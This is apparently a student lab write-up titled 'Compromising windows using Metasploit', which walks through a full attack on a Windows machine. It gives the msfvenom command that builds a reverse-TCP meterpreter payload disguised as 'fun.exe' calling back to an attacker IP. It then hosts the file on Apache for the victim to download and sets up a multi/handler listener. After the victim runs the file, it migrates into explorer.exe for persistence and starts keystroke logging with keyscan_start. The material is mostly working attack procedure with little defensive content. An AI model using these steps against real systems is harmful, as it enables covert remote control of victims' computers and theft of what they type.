# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:
### Find the attackers ip address using ifconfig
# OUTPUT:
![1](https://github.com/user-attachments/assets/2e3ffb21-94b3-442f-97df-7a921a6bcce7)
#### Create a malicious executable file fun.exe using msfvenom command
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
![2](https://github.com/user-attachments/assets/335086f0-1279-49d8-bd96-f073375e5835)
copy the fun.exe into the apache /var/www/html folder sudo systemctl apache2 start
## Check the status of apache2
# OUTPUT :
![3](https://github.com/user-attachments/assets/746204f0-3857-41b3-8240-a4685a629d2e)
### Invoke msfconsole:
# OUTPUT:
![5](https://github.com/user-attachments/assets/d5204efe-eacf-4d54-acd5-528d4b75eae4)
Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.
# OUTPUT :
![6](https://github.com/user-attachments/assets/dfb18162-3318-4606-ba46-48f4a359e047)
Starting a command and control Server use multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST 0.0.0.0 exploit
## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
# OUTPUT :
![7](https://github.com/user-attachments/assets/e6c1e699-6a9d-47b6-8f2c-b42a05794a72)
## WINDOWS :
On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine: http://192.168.1.2/fun.exe The file "fun.exe" downloads

# BROWSE OUTPUT :
![8](https://github.com/user-attachments/assets/5bfe68c9-9349-4cfc-8a3c-94b3d9bacce4)
## DOWNLOAD OUTPUT :
![9](https://github.com/user-attachments/assets/832b2958-60aa-49a7-ae17-09fa49b6ad6b)
## COME BACK TO PARROT :
To see a list of processes, at the meterpreter > prompt, execute this command: ps ⇒ can see the fun.exe process running with pid 1156
# OUTPUT :
![10](https://github.com/user-attachments/assets/3fb571a1-a088-4c25-94f2-7bdf7fed5900)
The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost. To become more persistent, we'll migrate to a process that will last longer. Let's migrate to the winlogon process. At the meterpreter > prompt, execute this command:

migrate -N explorer.exe at meterpreter > prompt, execute this command: netstat A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below. Notice the "PID/Program name" value for this connection, which is redacted

# OUTPUT :
![11](https://github.com/user-attachments/assets/536d207f-ece1-49ba-8929-d30d6a532707)
## WINDOWS OUTPUT :
![12](https://github.com/user-attachments/assets/824bc560-58b8-47a5-8cea-a0b16b983ac5)
Post Exploitation The target is now owned. Following are meterpreter commands for key capturing in the target machine keyscan_start Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.

# OUTPUT :
![13](https://github.com/user-attachments/assets/5c01b7a4-e709-40b9-b687-4403e532f302)
# RESULT:
The Metasploit framework is used to compromise windows and is examined successfully.
